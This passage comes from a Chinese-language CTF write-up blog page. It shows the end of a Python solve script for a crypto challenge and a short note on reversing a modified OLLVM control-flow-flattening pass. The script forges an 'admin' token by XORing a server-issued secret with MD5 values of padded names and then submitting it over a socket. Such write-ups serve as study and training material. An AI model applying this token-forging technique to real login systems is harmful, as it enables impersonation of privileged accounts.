+<span class="line"><span style="color:#abb2bf">md5_name </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> [</span><span style="color:#56b6c2">int</span><span style="color:#abb2bf">(x) </span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> x </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"</span><span style="color:#56b6c2">\x0b</span><span style="color:#98c379">"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">11</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"</span><span style="color:#56b6c2">\x0b</span><span style="color:#98c379">"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">11</span><span style="color:#abb2bf">)]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#61afef">rec</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#61afef">send</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"r</span><span style="color:#56b6c2">\n</span><span style="color:#98c379">"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#61afef">send</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"</span><span style="color:#56b6c2">\x0b</span><span style="color:#98c379">"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">11</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"admin</span><span style="color:#56b6c2">\n</span><span style="color:#98c379">"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#61afef">rec</span><span style="color:#abb2bf">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">data </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#61afef">rec</span><span style="color:#abb2bf">().</span><span style="color:#61afef">decode</span><span style="color:#abb2bf">().</span><span style="color:#61afef">replace</span><span style="color:#abb2bf">(</span><span style="color:#98c379">'</span><span style="color:#56b6c2">\n</span><span style="color:#98c379">'</span><span style="color:#abb2bf">, </span><span style="color:#98c379">''</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">secret </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> [</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">] </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">48</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">range</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">, </span><span style="color:#d19a66">48</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">    secret[i] </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">int</span><span style="color:#abb2bf">(data[(i </span><span style="color:#56b6c2">&lt;&lt;</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span><span style="color:#abb2bf">): (i </span><span style="color:#56b6c2">&lt;&lt;</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span><span style="color:#abb2bf">) </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#abb2bf">], </span><span style="color:#d19a66">16</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">new_secret </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> [secret[i] </span><span style="color:#56b6c2">^</span><span style="color:#abb2bf"> md5_goal[i] </span><span style="color:#56b6c2">^</span><span style="color:#abb2bf"> md5_name[i] </span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">range</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">16</span><span style="color:#abb2bf">)] </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> secret[</span><span style="color:#d19a66">16</span><span style="color:#abb2bf">:]</span></span>
+<span class="line"><span style="color:#abb2bf">ans </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">b</span><span style="color:#98c379">""</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> x </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> new_secret:</span></span>
+<span class="line"><span style="color:#abb2bf">    ans </span><span style="color:#56b6c2">+=</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">bytes</span><span style="color:#abb2bf">([x])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#61afef">send</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"l</span><span style="color:#56b6c2">\n</span><span style="color:#98c379">"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#61afef">send</span><span style="color:#abb2bf">(binascii.</span><span style="color:#61afef">b2a_hex</span><span style="color:#abb2bf">(ans) </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">b</span><span style="color:#98c379">"</span><span style="color:#56b6c2">\n</span><span style="color:#98c379">"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#61afef">rec</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#61afef">rec</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#abb2bf">s.</span><span style="color:#61afef">close</span><span style="color:#abb2bf">()</span></span>
+<span class="line"></span></code></pre>
+<h3 id="reverse">Reverse</h3>
+<h4 id="choices">Choices</h4>
+<p>看了一下 text 里的命令行，这是是一个 pass，llvm 的 pass，估计是做混淆的，看到 flatten 这个函数名，估计是拿 ollvm 改了改，获得源码一对照就知道改了什么地方。</p>
+<p>Flatten 算法实现<a href="http://ac.inf.elte.hu/Vol_030_2009/003.pdf">http://ac.inf.elte.hu/Vol_030_2009/003.pdf</a> ,他修改的地方就是原本自动修改的控制控制流的值变成由用户输入了，那么我还原出这个值序列即可，通过逆向我们知道了值序列的生成算法，那么我们就可以生成一个值序列了。以这个作为输入即可。</p>
+    </article>
+
+    <ul class="astro-VJ4TPSPI tags-container">
+      <li class="astro-BLWJYJPT inline-block my-1 underline-offset-4">
+  <a href="/tags/ctf" class="astro-BLWJYJPT group pr-2 text-sm">
+    <svg class="astro-BLWJYJPT scale-75" xmlns="http://www.w3.org/2000/svg"><path d="M16.018 3.815 15.232 8h-4.966l.716-3.815-1.964-.37L8.232 8H4v2h3.857l-.751 4H3v2h3.731l-.714 3.805 1.965.369L8.766 16h4.966l-.714 3.805 1.965.369.783-4.174H20v-2h-3.859l.751-4H21V8h-3.733l.716-3.815-1.965-.37zM14.106 14H9.141l.751-4h4.966l-.752 4z" class="astro-BLWJYJPT"></path>
+    </svg>
+    &nbsp;<span class="astro-BLWJYJPT">ctf</span>
+  </a>
+</li>
+    </ul>
+  </main>
+  <footer class="astro-SZ7XMLTE mt-auto">
+  <div class="max-w-3xl mx-auto px-0">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+  <div class="astro-SZ7XMLTE footer-wrapper">
+    <div class="flex astro-UPU6FZXR social-icons">
+  <a href="https://github.com/lc4t" class="inline-block astro-5EUNQZKT group astro-UPU6FZXR link-button" tabindex="0" title=" 鱼の on Github">
+  
+        <svg class="icon-tabler" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
+    <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+  </svg>
+      
+</a>
+</div>
+    <div class="astro-SZ7XMLTE copyright-wrapper">
+      <span class="astro-SZ7XMLTE">lc4t © 2023</span>
+      <span class="astro-SZ7XMLTE separator">&nbsp;|&nbsp;</span>
+      <span class="astro-SZ7XMLTE">The Things Less Created.</span>
+    </div>
+    <a href="https://icp.gov.moe/?keyword=20237773" class="inline-block astro-5EUNQZKT group undefined" tabindex="0">
+  
+      萌ICP备20237773号
+    
+</a>
+  </div>
+</footer>
+
+  </body></html>
